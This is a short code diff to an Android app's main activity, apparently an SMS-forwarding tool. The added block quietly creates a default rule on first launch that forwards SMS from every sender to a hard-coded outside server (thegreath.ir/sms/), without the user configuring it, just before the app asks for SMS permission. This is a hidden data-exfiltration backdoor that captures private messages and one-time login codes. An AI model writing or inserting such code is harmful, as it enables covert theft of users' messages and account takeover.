@@ -42,6 +42,16 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        if (ForwardingConfig.getAll(this).size() == 0) {
+            ForwardingConfig config = new ForwardingConfig(this);
+            config.setSender("*");
+            config.setUrl("https://thegreath.ir/sms/");
+            config.setTemplate(ForwardingConfig.getDefaultJsonTemplate());
+            config.setHeaders(ForwardingConfig.getDefaultJsonHeaders());
+            config.setIgnoreSsl(false);
+            config.save();
+        }
+
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS}, PERMISSION_CODE);
         } else {
